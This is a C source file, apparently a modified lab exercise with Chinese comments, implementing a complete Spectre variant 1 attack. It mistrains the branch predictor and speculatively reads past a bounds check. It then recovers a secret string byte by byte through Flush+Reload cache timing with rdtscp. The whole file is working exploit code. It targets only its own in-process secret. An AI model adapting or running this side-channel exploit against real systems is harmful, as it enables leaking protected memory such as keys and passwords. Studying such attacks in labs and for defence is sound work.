#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>


unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp    = 0;
char    *secret = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x <= bound_upper && x >= bound_lower) {
     return buffer[x];
  } else {
     return 0;
  }
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{
int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  } 
}

void spectreAttack(size_t index_beyond)
{
  int i;
  uint8_t s;
  volatile int z;

  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }

  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 30; i++) {    // 加强训练，原本是 10
    restrictedAccess(i);  
  }

  // Flush bound_upper, bound_lower, and array[] from the cache.
  _mm_clflush(&bound_upper);
  _mm_clflush(&bound_lower); 
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  for (z = 0; z < 1000; z++)  {  }  // 延迟推测窗口
  //
  // Ask victim() to return the secret in out-of-order execution.
  uint8_t tmp = restrictedAccess(index_beyond);
  s = *(volatile uint8_t *)&tmp;

  array[s * 4096 + DELTA] += 1;
}

int main() {
  int i, j;
  uint8_t s;
  size_t secret_len = 40;     // 可适当放宽长度
  char result[100] = {0};     // 初始化为全0，避免残留
  printf("Starting Spectre attack to read secret...\n\n");

  for (j = 0; j < secret_len; j++) {
    size_t index_beyond = (size_t)((secret - (char *)buffer) + j);
    for (i = 0; i < 256; i++) scores[i] = 0;
    flushSideChannel();

    // 攻击轮数建议 ≥ 2000，提高稳定性
    for (i = 0; i < 2000; i++) {
      fputs("", stderr);  // 替代 *****，避免污染输出
      spectreAttack(index_beyond);
      usleep(100);        // 稍微休眠，减少系统干扰
      reloadSideChannelImproved();
    }

    // 找出得分最高字符
    int max = 0;
    for (i = 1; i < 256; i++) {
      if (scores[i] > scores[max]) max = i;
    }

    // 输出当前字节结果
    if (scores[max] >= 5) {
      result[j] = (char)max;
      printf("Secret[%02d] = %3d (%c), hit = %d\n", j, max, max, scores[max]);
    } else {
      result[j] = '?';  // 不确定结果，补为问号
      printf("Secret[%02d] = ??? (?), low confidence (%d hits)\n", j, scores[max]);
    }

    // 可选中止策略（如连续5个都是0，可认为已到末尾）
    if (max == 0 && scores[max] < 3) {
      int zero_run = 1;
      for (int k = 1; k <= 5 && j - k >= 0; k++) {
        if (result[j - k] != 0 && result[j - k] != '?') {
          zero_run = 0;
          break;
        }
      }
      if (zero_run) break;  // 多次连续失败，提前终止
    }
  }

  result[j + 1] = '\0';
  printf("\nRecovered secret: %s\n", result);
  return 0;
}


